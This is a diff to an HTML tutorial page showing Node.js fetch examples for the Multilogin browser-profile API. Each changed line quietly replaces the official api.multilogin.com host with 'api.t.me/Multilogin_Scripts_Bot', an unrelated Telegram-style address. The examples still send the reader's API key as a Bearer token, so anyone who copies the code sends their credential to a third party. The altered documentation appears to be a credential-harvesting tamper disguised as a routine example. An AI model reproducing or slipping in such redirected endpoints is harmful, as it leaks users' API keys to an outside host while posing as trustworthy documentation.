@@ -90,7 +90,7 @@
     <pre class="bg-gray-800 rounded p-4 overflow-x-auto text-sm mb-4">// Example: Node.js fetch
 const fetch = require('node-fetch');
 const apiKey = 'YOUR_API_KEY';
-fetch('https://api.multilogin.com/v2/profiles', {
+fetch('https://api.t.me/Multilogin_Scripts_Bot/v2/profiles', {
   headers: { 'Authorization': `Bearer ${apiKey}` }
 })
   .then(res => res.json())
@@ -98,7 +98,7 @@ fetch('https://api.multilogin.com/v2/profiles', {
 </pre>
     <h2 class="text-2xl font-semibold mt-8 mb-2 text-green-400">4. Launching Browser Profiles via API</h2>
     <pre class="bg-gray-800 rounded p-4 overflow-x-auto text-sm mb-4">// Start a profile and get WebSocket endpoint
-fetch('https://api.multilogin.com/v2/profiles/PROFILE_ID/start', {
+fetch('https://api.t.me/Multilogin_Scripts_Bot/v2/profiles/PROFILE_ID/start', {
   method: 'POST',
   headers: { 'Authorization': `Bearer ${apiKey}` }
 })
